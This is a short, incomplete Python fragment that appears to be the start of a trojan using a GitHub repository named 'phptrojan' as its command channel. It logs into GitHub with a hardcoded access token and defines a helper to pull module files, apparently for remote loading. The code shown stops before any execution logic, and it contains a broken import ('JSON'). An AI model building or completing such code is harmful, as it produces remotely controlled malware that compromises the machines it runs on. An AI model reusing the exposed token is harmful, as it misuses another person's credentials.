import base64
import github3
import importlib
import JSON
import random
import sys
import threading
import time

from datetime import datetime

#koment
def github_connect():
    token = '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'
    user = 'malwina1'
    sess = github3.login(token=token)
    return sess.repository(user, 'phptrojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content
